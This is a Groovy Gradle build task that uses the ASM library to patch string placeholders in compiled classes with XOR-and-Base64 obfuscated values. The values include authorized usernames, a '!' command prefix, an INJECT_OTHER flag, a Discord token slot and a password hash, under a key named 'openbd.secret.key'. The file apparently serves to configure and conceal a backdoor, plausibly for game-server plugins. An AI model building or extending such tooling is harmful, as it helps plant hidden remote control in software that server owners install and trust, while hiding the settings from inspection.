package com.tmquan2508.gradle

import org.gradle.api.DefaultTask
import org.gradle.api.file.DirectoryProperty
import org.gradle.api.provider.Property
import org.gradle.api.tasks.Input
import org.gradle.api.tasks.InputDirectory
import org.gradle.api.tasks.OutputDirectory
import org.gradle.api.tasks.TaskAction
import org.objectweb.asm.ClassReader
import org.objectweb.asm.ClassWriter
import org.objectweb.asm.tree.*

import java.nio.file.Files
import java.nio.file.Path
import java.util.Base64

abstract class InjectConfig extends DefaultTask {

    private static final String SECRET_KEY = "openbd.secret.key"

    @InputDirectory
    abstract DirectoryProperty getClassesDir()

    @OutputDirectory
    abstract DirectoryProperty getOutputClassesDir()

    @Input
    abstract Property<String> getTargetClass()

    private static final Map<String, String> REPLACEMENT_MAP = [
            "::UUIDS::"        : "",
            "::USERNAMES::"    : "Kudo,Vdung",
            "::PREFIX::"       : "!",
            "::INJECT_OTHER::" : "false",
            "::WARNINGS::"     : "true",
            "::DISCORD_TOKEN::": "",
            "::PASSWORD::"     : "5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5",
            "::TRUE::"         : "true"
    ]

    byte[] xorEncrypt(String input) {
        byte[] inputBytes = input.getBytes("UTF-8")
        byte[] keyBytes = SECRET_KEY.getBytes("UTF-8")
        byte[] outputBytes = new byte[inputBytes.length]
        for (int i = 0; i < inputBytes.length; i++) {
            outputBytes[i] = (byte) (inputBytes[i] ^ keyBytes[i % keyBytes.length])
        }
        return outputBytes
    }

    boolean patchClassNode(ClassNode cn) {
        boolean changed = false
        cn.methods?.each { MethodNode mn ->
            mn.instructions?.each { AbstractInsnNode insn ->
                if (insn instanceof LdcInsnNode) {
                    def cst = (insn as LdcInsnNode).cst
                    if (cst instanceof String) {
                        String s = (String) cst
                        if (REPLACEMENT_MAP.containsKey(s)) {
                            String originalVal = REPLACEMENT_MAP.get(s)

                            byte[] xorBytes = xorEncrypt(originalVal)
                            String finalEncryptedVal = Base64.getEncoder().encodeToString(xorBytes)
                            
                            logger.lifecycle("  [LDC] in ${cn.name}.${mn.name}${mn.desc} -> replacing constant: '${s}' -> '${finalEncryptedVal}' (XOR + Base64 encrypted)")
                            (insn as LdcInsnNode).cst = finalEncryptedVal
                            changed = true
                        }
                    }
                }
            }
        }
        return changed
    }

    @TaskAction
    void execute() throws Exception {
        def classesDirFile = classesDir.get().asFile
        def outputDirFile = outputClassesDir.get().asFile
        def targetClassName = targetClass.get()

        if (!classesDirFile.exists()) throw new RuntimeException("classes dir not found: " + classesDirFile)
        if (!outputDirFile.exists()) outputDirFile.mkdirs()

        logger.lifecycle("-> Starting value injection task.")

        String targetPathStr = targetClassName.replace('.', '/') + ".class"
        Path inPath = classesDirFile.toPath().resolve(targetPathStr)

        if (!Files.exists(inPath)) {
            logger.error("  [ERROR] Target class not found: " + targetPathStr)
            return
        }

        List<Path> filesToProcess = [inPath]
        byte[] mainClassBytes = Files.readAllBytes(inPath)
        ClassReader mainCr = new ClassReader(mainClassBytes)
        ClassNode mainCn = new ClassNode()
        mainCr.accept(mainCn, 0)
        
        mainCn.innerClasses?.each { InnerClassNode icn ->
            if (icn.outerName == mainCn.name) {
                logger.lifecycle("  [DISCOVERY] Found nested class: ${icn.name}")
                Path nestedClassPath = classesDirFile.toPath().resolve(icn.name + ".class")
                if (Files.exists(nestedClassPath)) {
                    filesToProcess.add(nestedClassPath)
                } else {
                    logger.warn("  [WARN] Nested class file not found: ${nestedClassPath}")
                }
            }
        }

        filesToProcess.unique().each { Path classFilePath ->
            logger.lifecycle("  [PATCH] Processing: " + classesDirFile.toPath().relativize(classFilePath))
            byte[] classBytes = Files.readAllBytes(classFilePath)
            
            ClassReader cr = new ClassReader(classBytes)
            ClassNode cn = new ClassNode()
            cr.accept(cn, 0)

            if (patchClassNode(cn)) {
                ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS)
                cn.accept(cw)
                byte[] outBytes = cw.toByteArray()

                Path targetOut = outputDirFile.toPath().resolve(classesDirFile.toPath().relativize(classFilePath))
                Files.createDirectories(targetOut.getParent())
                Files.write(targetOut, outBytes)
                
                logger.lifecycle("  [OK] Wrote patched class to " + targetOut)
            } else {
                logger.lifecycle("  [INFO] No placeholders found in ${cn.name}. Skipping write.")
                Path targetOut = outputDirFile.toPath().resolve(classesDirFile.toPath().relativize(classFilePath))
                Files.createDirectories(targetOut.getParent())
                Files.copy(classFilePath, targetOut, java.nio.file.StandardCopyOption.REPLACE_EXISTING)
            }
        }

        logger.lifecycle("-> Task finished processing " + targetClassName + " and its nested classes.")
    }
}